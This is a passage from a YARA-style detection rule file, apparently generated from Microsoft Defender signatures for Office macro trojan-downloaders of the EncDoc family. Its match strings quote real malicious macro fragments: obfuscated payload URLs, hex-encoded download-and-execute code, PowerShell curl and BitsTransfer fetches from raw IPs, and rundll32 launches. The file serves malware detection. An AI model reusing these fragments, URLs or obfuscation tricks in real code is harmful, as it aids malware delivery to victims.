        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Shell(\"wscript \" + \"browserapp.js\", vbNormalFocus)" ascii //weight: 1
        $x_1_2 = "'MsgBox (\"jhegjhegyguytrugih3fbhyr3hfhu3yruhfvhb3jnefhv3uyejfbvjheiuhefhvuu3hiefhvuihj\")" ascii //weight: 1
        $x_1_3 = "WriteLine Worksheets(\"Sheet2\").Range(\"BN811\").Value" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VLA_2147795134_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VLA!MTB"
        threat_id = "2147795134"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"She\" + \"ll.Ap\" + \"plic\" + \"ation\")" ascii //weight: 1
        $x_1_2 = "CallByName(igcXr, \"Sh\" + \"el\" + \"lExe\" + \"cute\", VbMethod, URxl(0), URxl(1), URxl(2), URxl(3), URxl(4))" ascii //weight: 1
        $x_1_3 = "\"ping google.com;\" + eeeew" ascii //weight: 1
        $x_1_4 = "\"p\" + ifgkdfg" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VLA_2147795134_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VLA!MTB"
        threat_id = "2147795134"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"t\"&\"t\"&\"ps://o\"&\"n\"&\"line\"&\"yo\"&\"gaco\"&\"urse.org/5hgP7n5nTC/a.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_2 = "h\"&\"t\"&\"t\"&\"ps://rab\"&\"edc.com/ms\"&\"dcluV8y5nf/alf.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_3 = "h\"&\"t\"&\"t\"&\"ps://par\"&\"tiuv\"&\"amos\"&\"viajar.com/xYIJTUcGxvF1/alfo.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VLA_2147795134_6
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VLA!MTB"
        threat_id = "2147795134"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"h\"&\"t\"&\"t\"&\"ps://r\"&\"e\"&\"c\"&\"api\"&\"tol.com/pl92fI\"&\"eHE11X/fil\"&\"ht.ht\"&\"ml\"" ascii //weight: 1
        $x_1_2 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s://bo\"&\"og\"&\"ie\"&\"p\"&\"r\"&\"oducti\"&\"ons.com.au/jJNW2LDF/filk\"&\"fht.h\"&\"tml" ascii //weight: 1
        $x_1_3 = "\"h\"&\"t\"&\"tp\"&\"s://i\"&\"u.ac.bd/Qp\"&\"Pq\"&\"5lm6Xy/fik\"&\"fh.h\"&\"t\"&\"m\"&\"l\",\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VLA_2147795134_7
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VLA!MTB"
        threat_id = "2147795134"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"h\"&\"tt\"&\"ps://ha\"&\"mz\"&\"a\"&\"tra\"&\"de\"&\"rsbkr.com/29i\"&\"np\"&\"CqpjYK/l\"&\"ipa\"&\"ss.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_2 = "\"h\"&\"tt\"&\"p\"&\"s://jud\"&\"ge\"&\"2w\"&\"in.com/g2A\"&\"jdl9\"&\"OK/lipas.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_3 = "\"h\"&\"tt\"&\"ps://re\"&\"n\"&\"er\"&\"od\"&\"rigues.com.br/vOgdDJDBqdJy/lip.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SJJ_2147795234_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SJJ!MTB"
        threat_id = "2147795234"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".Open otvbpwmuptojdjd(\"474554\"), otvbpwmuptojdjd(\"687474\") & otvbpwmuptojdjd(\"703a2f2f33372e3233332e3130322e33352f6477612e657865\"), False" ascii //weight: 1
        $x_1_2 = "= Environ(\"AppData\")" ascii //weight: 1
        $x_1_3 = ".Type = 1" ascii //weight: 1
        $x_1_4 = ".write rdpuwxxrdxs.responseBody" ascii //weight: 1
        $x_1_5 = ".savetofile hpteeuqeoemxxt & otvbpwmuptojdjd(\"5c6477612e65\") & otvbpwmuptojdjd(\"7865\"), 2" ascii //weight: 1
        $x_1_6 = "Shell (hpteeuqeoemxxt & otvbpwmuptojdjd(\"5c647761\") & otvbpwmuptojdjd(\"2e657865\"))" ascii //weight: 1
        $x_1_7 = "Application.ScreenUpdating = True" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ALB_2147795310_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ALB!MTB"
        threat_id = "2147795310"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"t\"&\"t\"&\"p://p\"&\"roflizbowles.com/FC28yk4Sx7Rr/s\"&\"ep.h\"&\"tml" ascii //weight: 1
        $x_1_2 = "h\"&\"t\"&\"t\"&\"p://a\"&\"ccess-cs.com/WH0dOuF31Vjo/sep.h\"&\"tml" ascii //weight: 1
        $x_1_3 = "h\"&\"t\"&\"t\"&\"p\"&\"s://d\"&\"r\"&\"eamonvibes.gr/PH5NmKjhY7js/sep.h\"&\"t\"&\"ml" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PDM_2147795370_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PDM!MTB"
        threat_id = "2147795370"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "eval('}+%^)+%^\"+%^2+%^5+%^.+%^8+%^5+%^.+%^9+%^1+%^.+%^3+%^2+%^/+%^/+%^:+%^p+%^t+%^t+%^h" ascii //weight: 1
        $x_1_2 = "\"+%^r+%^e+%^l+%^l+%^a+%^t+%^s+%^n+%^I+%^.+%^r+%^e+%^l+%^l+%^a+%^t+%^s+%^n+%^I+%^s+%^w+%^o+%^d+%^n+%^i+%^W+%^\"" ascii //weight: 1
        $x_1_3 = "h+%^t+%^i+%^w'.split('+%^').reverse().join('')" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PDA_2147795901_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PDA!MTB"
        threat_id = "2147795901"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "-w hi slee^p -Se 31;Sta^rt-BitsTrans^fer -Source htt`p://ddl7.data.hu/get/341676/13058139/KS.e`xe\"" ascii //weight: 1
        $x_1_2 = "Destination C:\\Users\\Public\\Documents\\accountforeign.e`xe\" &" ascii //weight: 1
        $x_1_3 = "CreateObject(sheee & \"l.application\").Open(yetothers)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ALF_2147796568_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ALF!MTB"
        threat_id = "2147796568"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"t\"&\"tp\"&\"s://sa\"&\"mtnpy.org/bveCGKTX/ghb.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_2 = "h\"&\"tt\"&\"ps://m\"&\"ass\"&\"ngo.org/dXKvyKV9v8c/ghb.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_3 = "h\"&\"t\"&\"tps://va\"&\"th\"&\"iriyar.org/uy0Tk0keJUr/ghb.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ALG_2147796652_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ALG!MTB"
        threat_id = "2147796652"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"tt\"&\"ps://adri\"&\"car\"&\"aut\"&\"ocenter.com.br/hIIYY6fH/index.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_2 = "h\"&\"ttp\"&\"s://rea\"&\"dcen\"&\"tre.org.in/Dfx6lucN1Nn/index.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_3 = "h\"&\"tt\"&\"ps://sace\"&\"wd\"&\"tr\"&\"ust.org.in/xaWRjapI/index.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_4 = "h\"&\"t\"&\"tp\"&\"s://rick\"&\"co\"&\"vell.net/BuQQdjLrrO19/li.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_5 = "h\"&\"ttp\"&\"s://netw\"&\"or\"&\"ktmg.com/ryrwQGN3wPpT/li.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_6 = "h\"&\"t\"&\"tps://tha\"&\"mi\"&\"lan\"&\"da.co.in/fui6yOqX0Wyb/li.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_7 = "h\"&\"tt\"&\"ps://me\"&\"ett\"&\"ru\"&\"st.in/aMZID8gQ/u.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_8 = "h\"&\"tt\"&\"ps://aqi\"&\"ssa\"&\"rafood.com.my/eAu\"&\"610r\"&\"n3w8V/u.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_9 = "h\"&\"tt\"&\"ps://ra\"&\"dio\"&\"ca\"&\"ca.top/RVDXQ4D7cWU6/u.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ALH_2147796754_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ALH!MTB"
        threat_id = "2147796754"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"t\"&\"t\"&\"ps://s\"&\"h\"&\"ri\"&\"de\"&\"v\"&\"grc.com/Xdlo4AOTRHe/aleo.g\"&\"i\"&\"f" ascii //weight: 1
        $x_1_2 = "h\"&\"tt\"&\"ps://vi\"&\"c\"&\"ssa.com.br/EdG5y1gzu/aleo.g\"&\"i\"&\"f" ascii //weight: 1
        $x_1_3 = "h\"&\"tt\"&\"ps://sh\"&\"aha\"&\"jay.com.np/UHuKXcN8pd/aleo.g\"&\"i\"&\"f" ascii //weight: 1
        $x_1_4 = "h\"&\"ttp\"&\"s://ca\"&\"pax\"&\"i\"&\"on.cl/7SjU50ph/h.g\"&\"i\"&\"f" ascii //weight: 1
        $x_1_5 = "h\"&\"t\"&\"t\"&\"p\"&\"s://sa\"&\"hm\"&\"a\"&\"ni\"&\"sh.com.np/QtIKuTt6hBz/h.g\"&\"i\"&\"f" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_STJ_2147796839_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.STJ!MTB"
        threat_id = "2147796839"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Language = ActiveWorkbook.BuiltinDocumentProperties(\"Category\").Value" ascii //weight: 1
        $x_1_2 = {2e 41 64 64 43 6f 64 65 20 28 41 63 74 69 76 65 57 6f 72 6b 62 6f 6f 6b 2e 42 75 69 6c 74 69 6e 44 6f 63 75 6d 65 6e 74 50 72 6f 70 65 72 74 69 65 73 28 22 54 69 74 6c 65 22 29 2e 56 61 6c 75 65 29 [0-10] 45 6e 64 20 57 69 74 68 [0-3] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_3 = {41 74 74 72 69 62 75 74 65 20 56 42 5f 4e 61 6d 65 20 3d 20 22 4d 6f 64 75 6c 65 31 22 [0-3] 46 75 6e 63 74 69 6f 6e 20 41 75 74 6f 5f 4f 70 65 6e 28 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_STJ_2147796839_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.STJ!MTB"
        threat_id = "2147796839"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"lic\\skeml.l\" & Left(rockbottom, 1) & Right(Left(rockbottom, 4), 1)" ascii //weight: 1
        $x_1_2 = "fcs09b1l & \"lic\\webnote.js\"" ascii //weight: 1
        $x_1_3 = "godknows = Replace(\"cmd /c pow^fcs09b1lrs^hfcs09b1lll/W 01 c^u^rl htt^p://209.127.20.13/wokfcs09b1l.j^s -o \" & x6iy & \";\" & x6iy, \"fcs09b1l\", \"e\")" ascii //weight: 1
        $x_1_4 = "Replace(\"rundz_a_d_fz_a_d_f32 urz_a_d_f.dz_a_d_fz_a_d_f,OpenURL \" & akcj32v30du, \"z_a_d_f\", \"l\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_BVK_2147796862_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.BVK!MTB"
        threat_id = "2147796862"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"tt\"&\"ps://lun\"&\"et\"&\"iles.com/UAh\"&\"btn3p\"&\"wUdx/goh.g\"&\"i\"&\"f" ascii //weight: 1
        $x_1_2 = "h\"&\"t\"&\"t\"&\"ps://k\"&\"ri\"&\"via.in/oqy2o4lk/goh.g\"&\"i\"&\"f" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ASL_2147797041_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ASL!MTB"
        threat_id = "2147797041"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"tt\"&\"ps://soc\"&\"cera\"&\"ge\"&\"nt\"&\"net\"&\"work.com/ZQWU\"&\"Lm\"&\"RiNlOY/asp.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_2 = "h\"&\"tt\"&\"p\"&\"s://o\"&\"nu\"&\"s.com.py/qf\"&\"oF0t\"&\"HVn/asp.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_3 = "h\"&\"tt\"&\"ps://lt\"&\"no\"&\"tic\"&\"ias.com.ar/OOd\"&\"FLi\"&\"SaJ0/asp.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_4 = "h\"&\"tt\"&\"p\"&\"s://cli\"&\"ka\"&\"rtes.com.br/Q\"&\"1Nv\"&\"o\"&\"fJt/s\"&\"ou.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_5 = "h\"&\"tt\"&\"ps://m\"&\"erco\"&\"v\"&\"et.com.py/LC\"&\"PP\"&\"B7hdyNZ/sou.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_6 = "h\"&\"tt\"&\"ps://i\"&\"dr\"&\"a.pe/zASd\"&\"wc\"&\"x2/sou.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_7 = "h\"&\"tt\"&\"ps://e\"&\"scud\"&\"ob\"&\"eta.com.mx/aDLMYeSJR/index.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_8 = "h\"&\"ttps://fo\"&\"rmas\"&\"eg\"&\"uros.com.br/oL3MJ83NJ/index.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_9 = "h\"&\"tt\"&\"ps://alo\"&\"ksc\"&\"ho\"&\"ol.org/WEmi0qAzrdcd/index.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_10 = "h\"&\"ttp\"&\"s://de\"&\"met\"&\"ria.com.ar/zCMIznLT/index.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_11 = "h\"&\"ttp\"&\"s://ne\"&\"tco\"&\"log\"&\"ne.de.skycheaper.com/pDA8T6YMLDNX/index.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_12 = "h\"&\"ttp\"&\"s://m\"&\"usi\"&\"cva\"&\"lley.criss\"&\"cros\"&\"sso\"&\"luti\"&\"ons.in/iIs72LkZ/index.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_13 = "h\"&\"t\"&\"t\"&\"p\"&\"s://houstonmarinediesel.com/riFcZvXl/n.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_14 = "h\"&\"t\"&\"t\"&\"p\"&\"s://arboretum-abracaral.com.ar/Ipubi8Fcp5V/n.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_15 = "h\"&\"t\"&\"t\"&\"ps://ritelteamindonesia.co.id/basdS1syf/n.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PAQ_2147797318_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PAQ!MTB"
        threat_id = "2147797318"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "shell(\"c:\\\\windows\\\\system32\\\\cmd.exe/v/d/c\"\"setskk" ascii //weight: 1
        $x_1_2 = "hln5ttp:';gln5etobjln5ect(c+d+'&&sethxd=lvmxdlvmxdt865f" ascii //weight: 1
        $x_1_3 = "hta|start!px!!unuu!.hta\"\"\"),vbhi" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIA_2147797508_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIA!MTB"
        threat_id = "2147797508"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s://ini-ip\"&\"patmajalengka.com/9dv886HWC/l.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_2 = "\"h\"&\"tt\"&\"p\"&\"s://merwedding.com.tr/vckdH4zr1/l.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_3 = "\"h\"&\"t\"&\"t\"&\"ps://p\"&\"res\"&\"tigeldnservices.co.uk/71RgP1QoL/l.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_VIA_2147797508_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.VIA!MTB"
        threat_id = "2147797508"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s://e\"&\"m\"&\"a\"&\"il.ca\"&\"su\"&\"als\"&\"treet.com.br/CjlEWm6E/go.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_2 = "\"h\"&\"tt\"&\"ps://a\"&\"u\"&\"to\"&\"sa\"&\"lde\"&\"tal\"&\"le.com.ar/9l\"&\"2E\"&\"zEK\"&\"0nSLw/go.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_3 = "\"h\"&\"tt\"&\"ps://a\"&\"lu\"&\"m\"&\"ni.i\"&\"tb.ac.id/O\"&\"a0\"&\"3Ij\"&\"P7\"&\"fE/go.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RPQ_2147797914_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RPQ!MTB"
        threat_id = "2147797914"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"pow^ers\"" ascii //weight: 1
        $x_1_2 = "= \"he^ll\"" ascii //weight: 1
        $x_1_3 = "= \"C:\\Users\\Public\\Documents\\god.bat\"" ascii //weight: 1
        $x_1_4 = {53 65 74 20 [0-15] 20 3d 20 47 65 74 4f 62 6a 65 63 74 28}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_RPQ_2147797914_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.RPQ!MTB"
        threat_id = "2147797914"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s://orthomay.com.br/GD7A3PSD4zc/tw.html\"" ascii //weight: 1
        $x_1_2 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s://quebradadigital.com.br/ag2DVqIM/w.html\"" ascii //weight: 1
        $x_1_3 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s://mustafakhafimsp.af/UnE5kOnX/tw.html\"" ascii //weight: 1
        $x_1_4 = "\"h\"&\"t\"&\"t\"&\"p\"&\"://gupta-foods.xyz/dTEOdMByori/j.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_5 = "\"h\"&\"t\"&\"t\"&\"p\"&\"://gupta-airways.icu/MSOFjh0EXRR8/j.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_6 = {22 68 22 26 22 74 22 26 22 74 22 26 22 70 22 26 22 3a 2f 2f 67 75 70 74 61 2d [0-31] 2e [0-5] 2f [0-15] 2f [0-3] 2e 68 22 26 22 74 22 26 22 6d 22 26 22 6c}  //weight: 1, accuracy: Low
        $x_1_7 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":\"&\"//ileadafricanow.org/gZPZb6yK/n2.html\"" ascii //weight: 1
        $x_1_8 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":\"&\"/\"&\"/gcmhp.ps/0BDRCN8DXn/n3.html\"" ascii //weight: 1
        $x_1_9 = "\"h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":\"&\"/\"&\"/serviceexpress.com.br/7mpBmsflb7fe/n1.html\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_ASZ_2147798250_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.ASZ!MTB"
        threat_id = "2147798250"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
